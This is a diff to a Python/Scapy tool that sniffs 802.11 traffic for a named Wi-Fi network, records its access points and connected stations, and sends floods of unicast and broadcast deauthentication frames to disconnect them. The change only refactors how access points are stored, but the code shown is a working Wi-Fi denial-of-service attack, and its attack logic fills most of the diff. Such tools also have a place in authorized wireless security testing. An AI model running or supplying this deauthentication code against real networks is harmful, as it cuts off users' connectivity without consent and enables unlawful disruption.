@@ -86,15 +86,14 @@ def get_src_dst_network(frame):
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
 
-def register_ap(wifi_essid, bssid_ap, bssid_network, bssids_aps_dict):
+def register_ap(wifi_essid, bssid_ap, bssids_aps):
     '''ap registration'''
     
     try:
-        bssids_aps_dict.update({bssid_ap: bssid_network})
+        bssids_aps.add(bssid_ap)
         print_info(
             f'AP detected for network {wifi_essid}'
             f'\n    access point = {bssid_ap}'
-            f'\n    network      = {bssid_network}'
         )
     except Exception as e:
         raise MsgException(e, 'Detected access point could not be registered')
@@ -135,9 +134,7 @@ def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_netw
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
-        multiprocessing.Process(
-            target = unicast_deauth_parallel,
-        ).start()
+        multiprocessing.Process(target = unicast_deauth_parallel).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
     except Exception as e:
@@ -158,14 +155,12 @@ def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
-        multiprocessing.Process(
-            target = broadcast_deauth_parallel,
-        ).start()
+        multiprocessing.Process(target = broadcast_deauth_parallel).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
+def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, bssids_aps, bssids_stas_dict):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -175,12 +170,12 @@ def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves,
                 
                 # wlan type mgt subtype beacon or wlan type mgt subtype probe-resp
                 if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
-                    if (bssid_src not in bssids_whitelist) and (not bssids_aps_dict.get(bssid_src)):
+                    if (bssid_src not in bssids_whitelist) and (bssid_src not in bssids_aps):
                         dot11_element = frame.getlayer(dot11.Dot11Elt)
                         while dot11_element:
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
-                                    register_ap(wifi_essid, bssid_src, bssid_network, bssids_aps_dict)
+                                    register_ap(wifi_essid, bssid_src, bssids_aps)
                                     if broadcast_enabled:
                                         broadcast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_network)
                                 break
@@ -188,12 +183,12 @@ def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves,
                 
                 # wlan type mgt subtype probe-req
                 elif frame.haslayer(dot11.Dot11ProbeReq):
-                    if (bssid_dst not in bssids_whitelist) and is_unicast(bssid_dst) and (not bssids_aps_dict.get(bssid_dst)):
+                    if (bssid_dst not in bssids_whitelist) and is_unicast(bssid_dst) and (bssid_dst not in bssids_aps):
                         dot11_element = frame.getlayer(dot11.Dot11Elt)
                         while dot11_element:
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
-                                    register_ap(wifi_essid, bssid_dst, bssid_network, bssids_aps_dict)
+                                    register_ap(wifi_essid, bssid_dst, bssids_aps)
                                     if broadcast_enabled:
                                         broadcast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_network)
                                 break
@@ -201,10 +196,10 @@ def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves,
                 
                 # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                 else:
-                    if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
+                    if (bssid_src in bssids_aps) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
                         unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
-                    elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
+                    elif (bssid_dst in bssids_aps) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                         register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
                         unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
         
@@ -269,7 +264,7 @@ def main():
             'wlan type ctl',
             'wlan type data',
         ]
-        bssids_aps_dict = {} # {ap bssid: network bssid}
+        bssids_aps = set()
         bssids_stas_dict = {} # {sta bssid: ap bssid}
         sendrecv.sniff(
             iface = args.wifi_interface,
@@ -280,7 +275,7 @@ def main():
                 args.broadcast_enabled,
                 args.deauth_waves,
                 args.bssids_whitelist,
-                bssids_aps_dict,
+                bssids_aps,
                 bssids_stas_dict,
             ),
         )
